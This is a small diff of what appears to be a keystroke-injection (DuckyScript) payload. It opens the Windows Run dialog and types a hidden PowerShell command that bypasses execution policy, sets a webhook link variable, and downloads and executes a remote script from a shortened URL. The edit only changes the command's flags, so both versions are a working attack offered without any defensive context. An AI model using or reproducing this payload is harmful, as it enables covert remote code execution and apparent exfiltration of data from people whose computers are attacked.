@@ -15,5 +15,5 @@ DELAY 500
 ESC
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_LINK'; irm https://is.gd/feCDdx | iex
+STRING powershell -NoP -Ep Bypass -W H  $dc='WEBHOOK_LINK'; irm https://is.gd/feCDdx | iex
 ENTER
